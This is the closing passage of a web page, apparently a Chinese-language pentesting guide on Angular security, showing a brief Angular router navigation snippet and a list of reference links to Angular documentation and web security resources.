<p>结果：<code>http://localhost:4200/https:</code></p>
<p>以下方法也在域的范围内导航：</p>
<pre><code class="language-jsx">const routes: Routes = [ { path: '', redirectTo: 'ROUTE', pathMatch: 'prefix' } ]
this.router.navigate(['PATH'])
this.router.navigateByUrl('URL')
</code></pre>
<h2 id="参考文献"><a class="header" href="#参考文献">参考文献</a></h2>
<ul>
<li><a href="https://angular.io/">Angular</a></li>
<li><a href="https://lsgeurope.com/post/angular-security-the-definitive-guide-part-1">Angular Security: The Definitive Guide (Part 1)</a></li>
<li><a href="https://lsgeurope.com/post/angular-security-the-definitive-guide-part-2">Angular Security: The Definitive Guide (Part 2)</a></li>
<li><a href="https://lsgeurope.com/post/angular-security-the-definitive-guide-part-3">Angular Security: The Definitive Guide (Part 3)</a></li>
<li><a href="https://lsgeurope.com/post/angular-security-checklist">Angular Security: Checklist</a></li>
<li><a href="https://angular.io/guide/file-structure">Workspace and project file structure</a></li>
<li><a href="https://angular.io/guide/architecture-components">Introduction to components and templates</a></li>
<li><a href="https://angular.io/guide/workspace-config#source-map-configuration">Source map configuration</a></li>
<li><a href="https://angular.io/guide/binding-syntax">Binding syntax</a></li>
<li><a href="https://medium.com/angular-in-depth/angular-context-easy-data-binding-for-nested-component-trees-and-the-router-outlet-a977efacd48">Angular Context: Easy Data-Binding for Nested Component Trees and the Router Outlet</a></li>
<li><a href="https://angular.io/guide/security#sanitization-and-security-contexts">Sanitization and security contexts</a></li>
<li><a href="https://github.com/angular/angular/blob/main/packages/compiler/src/schema/dom_security_schema.ts">GitHub - angular/dom_security_schema.ts</a></li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md">XSS in Angular and AngularJS</a></li>
<li><a href="https://angular.io/guide/universal">Angular Universal</a></li>
<li><a href="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-xss">DOM XSS</a></li>
<li><a href="https://angular.io/api/core/ElementRef">Angular ElementRef</a></li>
<li><a href="https://angular.io/api/core/Renderer2">Angular Renderer2</a></li>
<li><a href="https://www.tektutorialshub.com/angular/renderer2-angular/">Renderer2 Example: Manipulating DOM in Angular - TekTutorialsHub</a></li>
<li><a href="http://api.jquery.com/">jQuery API Documentation</a></li>
<li><a href="https://blog.bitsrc.io/how-to-use-jquery-with-angular-when-you-absolutely-have-to-42c8b6a37ff9">How To Use jQuery With Angular (When You Absolutely Have To)</a></li>
<li><a href="https://angular.io/api/common/DOCUMENT">Angular Document</a></li>
<li><a href="https://angular.io/api/common/Location">Angular Location</a></li>
<li><a href="https://angular.io/api/router/Router">Angular Router</a></li>
</ul>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../network-services-pentesting/pentesting-web/aem-adobe-experience-cloud.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../network-services-pentesting/pentesting-web/apache.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../network-services-pentesting/pentesting-web/aem-adobe-experience-cloud.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../network-services-pentesting/pentesting-web/apache.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
